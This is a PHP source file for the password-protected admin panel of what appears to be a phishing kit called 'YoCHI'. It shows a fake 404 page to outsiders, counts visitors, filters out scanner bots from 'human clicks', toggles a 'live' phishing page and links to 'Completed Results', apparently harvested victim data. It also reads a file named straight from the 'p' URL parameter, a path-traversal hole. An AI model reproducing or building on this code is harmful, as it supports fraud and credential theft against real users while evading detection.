<?php 
session_start();
$yochadminpage=1;
include '../btm.php';
include '../settings.php';
if ($adminpanel != 1){
	header('HTTP/1.0 404 Not Found');die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
				<html>
					<meta name="viewport" content="width=device-width, initial-scale=1.0">
					<head>
						<title>404 Not Found</title>
						</head>
					<body>
						<h1>Not Found</h1>
						<p>The requested URL was not found on this server.</p>
					</body>
				</html>');exit();};$head='Yochi FUD Page';
$pgctnt = '';
if(isset($_POST['pass']) || isset($_SESSION['ston'])){
	if((isset($_POST['pass']) && $_POST['pass']==$adminpass)){$_SESSION['ston']=$adminpass;header('location:./?'.time().'='.md5(uniqid()));}
	elseif((isset($_SESSION['ston']) && $_SESSION['ston']==$adminpass)){$control='goodpass';

	$ud=file_get_contents('db.json');
	$udarray = json_decode($ud);
	$yo='';
	if(isset($_GET['p'])){@$yo=file_get_contents($_GET['p'].'.txt');die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
				<html><head><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>YoChi</title></head>
					<body>'.nl2br($yo).'</body></html>');exit();} 
	else{@$yo=file_get_contents('yo.txt');};
	if($udarray->status == 'on'){$st = 'green';} else{$st = 'red';};
	if($udarray->live == 'on'){$lp = 'green';$sl = '<a href="live" class="stat btn">Go to Live</a>';} else{$lp = 'red';$sl = '';};
	$pgctnt = '
<div class="dist">
<div style="font-size:18px;text-align:left;color:'.$st.';">LIVE STATUS<form method="post" action="proc" style="display:inline"><label class="switch"><input class="'.$udarray->status.'" type="submit" name="toggle" type="submit" value="on"><span class="slider round"></span></label></form></div>
<div style="font-size:18px;text-align:left;color:'.$lp.';">LIVE PANEL<form method="post" action="proc" style="display:inline"><label class="switch"><input class="'.$udarray->live.'" type="submit" name="toggleloop" type="submit" value="on"><span class="slider round"></span></label></form>'.$sl.'</div>
<div class="stathd">Visitor Statistics</div>
<span class="stat"><span class="count">'.count($udarray->visits).'</span><br/><span class="desc">Total Visitors</span></span>
<span class="stat red"><span class="count">'.count($udarray->bots).'</span><br/><span class="desc">Banned Bots</span></span>
<span class="stat green"><span class="count">'.count($udarray->humans).'</span><br/><span class="desc">Human Clicks</span></span><br/>
<a href="./?p=yo" class="stat btn">View Visitors</a>
<a href="./?p=bots" class="stat btn">View Bots</a>
<a href="./?p=Results" class="stat btn">View Completed Results</a>
<form method="post" action="proc" onsubmit="return confirm(&quot;Are you sure you want to reset all your data?\r\nThis will reset your result logs too, please make sure you save them elsewhere\r\n -- YoCHI&quot;);" style="display:inline"><input name="clear" style="width:auto;" type="submit" value="RESET ALL DATA"/></form></div>
<div class="dist log"><div class="stathd">View Visitor Log</div>
<div class="console">'.nl2br($yo).'</div></div>';}
	else{$control='wrongpass';};
}
else{$control='nopass';};
?>
<!DOCTYPE html>
<html>
<head>
<meta name='viewport' content='width=device-width,initial-scale=1.0'/>
<title>YoCHI Admin Panel</title>
<style>
*{padding:5px;box-sizing:border-box;}
html,body{margin:0;padding:0;font-family:verdana;font-size:15px;color:#fff;background-color:#333;}
.header{text-align:center;background-color:#262626;margin:0;padding:20px}
.stathd{padding:10px 0;font-size:20px;}
div{text-align:center;}
.stat{display:inline-block;height:140px;background-color:#262626;margin:5px;border-radius:5px;}
.stat.btn{display:inline-block;width:auto;height:auto;line-height:20px;padding:10px;color:#fff;text-decoration:none;}
.stat .desc{}
.stat .count{font-size:80px;}
.red{background-color:#800000;}
.green{background-color:#006600;}
.blue{background-color:#000066;}
form{width:100%;max-width:450px;margin:100px auto;padding:20px;}
input{width:100%;height:40px;;font-size:13px;}
input[type=submit]{width:100%;height:40px;background-color:#ddd;font-size:13px;border:none;padding:5px 10px;color:#000;}
.console{text-align:left;border-radius:5px;background-color:#8c8c8c;color:#060;width:90%;height:220px;margin:auto;overflow-y:auto;}
@media only screen and (min-width:720px){
	.dist{float:left;width:60%;}
	.dist.log{width:40%;}
	.console{width:100%;height:480px;margin:auto;overflow-y:auto;}
}

.switch {
  position: relative;
  display: inline-block;
  width: 60px;
  height: 34px;
}

/* Hide default HTML checkbox */
.switch input {
  opacity: 0;
  width: 0;
  height: 0;
}

/* The slider */
.slider {
  position: absolute;
  cursor: pointer;
  top: 0;
  left: 0;
  right: 0;
  bottom: 0;
  background-color: #ccc;
  -webkit-transition: .4s;
  transition: .4s;
}

.slider:before {
  position: absolute;
  content: "";
  height: 26px;
  width: 26px;
  left: 4px;
  bottom: 4px;
  background-color: white;
  -webkit-transition: .4s;
  transition: .4s;
}

input.on + .slider {
  background-color: #006600;
}
input.off + .slider {
  background-color: #800000;
}

input:focus + .slider {
  box-shadow: 0 0 1px green;
}

input.on + .slider:before {
  -webkit-transform: translateX(26px);
  -ms-transform: translateX(26px);
  transform: translateX(26px);
}

/* Rounded sliders */
.slider.round {
  border-radius: 34px;
}

.slider.round:before {
  border-radius: 50%;
}

</style>
</head>
<body>
<h1 class='header'>
<?php echo $head; ?>
</h1>
<div style='clear:both;display:<?php if($control=='goodpass'){echo 'block';} else{echo 'none';}?>'>
<?php echo $pgctnt; ?>
</div>
<div style='display:<?php if($control=='nopass' || $control=='wrongpass'){echo 'block';} else{echo 'none';}?>'>
<form method='post'>
<div class='red' style='visibility:<?php if($control=='wrongpass'){echo 'visible';} else{echo 'hidden';}?>'>
Fuck Outta Here !,<br/>Not Your Board, Come back when you've got the password
</div>
<input name='pass' placeholder='Enter your admin password'/>
<input type='submit' style='background-color:#262626;' value='Login'/>
</form>
</div>
</body>
</html>